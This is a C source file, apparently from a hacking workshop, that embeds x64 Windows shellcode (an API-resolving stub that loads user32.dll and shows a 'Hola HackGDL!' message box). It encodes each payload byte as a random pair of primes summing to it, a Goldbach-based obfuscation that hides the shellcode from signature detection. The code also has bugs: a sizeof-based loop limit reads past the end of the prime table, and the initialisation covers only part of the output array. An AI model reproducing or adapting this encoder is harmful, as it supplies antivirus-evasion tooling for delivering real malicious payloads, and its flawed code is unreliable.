#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

typedef struct {
	unsigned short firstPrime;
	unsigned short secondPrime;
}goldbachUnit; //Estructura de datos en la que se encodificara cada byte del payload como la suma de los numeros primos que lo componen

unsigned char plaintext[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
"\x8d\x8d\x46\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x49\xc7\xc1\x40\x00\x00\x00\x3e\x48\x8d\x95\x2a\x01\x00"
"\x00\x3e\x4c\x8d\x85\x38\x01\x00\x00\x48\x31\xc9\x41\xba"
"\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6"
"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80"
"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
"\xda\xff\xd5\x48\x6f\x6c\x61\x20\x48\x61\x63\x6b\x47\x44"
"\x4c\x21\x00\x48\x6f\x6c\x61\x20\x48\x61\x63\x6b\x47\x44"
"\x4c\x21\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";


goldbachUnit encodedText[350];


unsigned short primesUnder512[] = { //numeros primos menores a 512
2,3,5,7,11,13,17,19,23,29,31,
37,41,43,47,53,59,61,67,71,73,
79,83,89,97,101,103,107,109,113,127,
131,137,139,149,151,157,163,167,173,179,
181,191,193,197,199,211,223,227,229,233,
239,241,251,257,263,269,271,277,281,283,
293,307,311,313,317,331,337,347,349,353,
359,367,373,379,383,389,397,401,409,419,
421,431,433,439,443,449,457,461,463,467,
479,487,491,499,503,509 };

unsigned char goldbachVariations[] = { //cantidad de variaciones en suma de numeros primos que tiene cada numero par entre el 4 y el 518 
1,1,2,3,2,3,4,4,4,5,6,5,4,6,4,
7,8,3,6,8,6,7,10,8,6,10,6,7,12,5,10,
12,4,10,12,9,10,14,8,9,16,9,8,18,8,9,14,
6,12,16,10,11,16,12,14,20,12,11,24,7,10,20,6,
14,18,11,10,16,14,15,22,11,10,24,8,16,22,9,16,
20,10,11,26,18,12,22,14,13,28,12,16,26,10,16,22,
13,18,26,16,17,28,13,14,38,12,15,26,13,18,22,14,
13,24,18,14,30,18,18,36,16,18,32,12,18,32,17,16,
28,20,17,32,16,18,38,14,21,32,13,28,32,16,24,34,
20,16,38,16,21,42,17,20,30,16,24,34,17,20,30,22,
22,40,13,20,48,12,21,38,18,26,34,20,17,32,26,20,
40,18,19,44,15,28,36,16,28,36,20,22,44,26,19,38,
23,18,54,22,21,42,13,28,34,22,26,40,26,22,42,20,
22,60,21,24,42,18,28,38,26,22,42,28,26,42,23,26,
54,24,23,48,17,32,56,24,25,48,30,26,46,28,21,58,
21,28,46,18,38,44,26,26,46,26,29,54,30,28,64,22,
27
};

goldbachUnit goldbachEncode(unsigned char number) {
	goldbachUnit unit; unit.firstPrime = 0; unit.secondPrime = 0; //inicializacion de unidad de codificacion
	int numberb = (int)number;
	int variations = 0;
	int variation = rand() % goldbachVariations[number]; //se obtiene una variacion aleatoria
	int limit = sizeof(primesUnder512);
	for (int i = 0; i < limit; i++) {
		for (int j = 0; j < limit; j++) {
			int result = primesUnder512[i] + primesUnder512[j];
			if (result == (numberb * 2) + 4) { //se multiplica cada byte por 2 y se le suman 4 y se le codifica como la suma de los numeros primos que componen el resultado de esas operaciones
				if (variations == variation) { //se almacena en la unidad de codificacion los numeros primos obtenidos si son la variacion elegida por azar
					unit.firstPrime = primesUnder512[i]; unit.secondPrime = primesUnder512[j];
					return unit;
				}
				variations++;
			}
		}
	}
	return unit;
}


int main()
{
	srand(time(NULL));

	for (int i = 0; i < 100; i++) {
		encodedText[i].firstPrime = 0;
		encodedText[i].secondPrime = 0;
	}


	printf("%s", "goldbachUnit encodedPayload[] ={\n");
	for (int i = 0; i < sizeof(plaintext); i++) {
		encodedText[i] = goldbachEncode(plaintext[i]); //encodificacion de cada byte
		printf("{0x%x,0x%x}", encodedText[i].firstPrime, encodedText[i].secondPrime); //se imprime la representacion Goldbach de cada byte codificado
		if (i < sizeof(plaintext) - 1) printf("%s", ",");
		if (i % 10 == 0 && i>0) {
			printf("%s", "\n");
		}
	}
	printf("%s", "};\n");
	
	return 0;
}
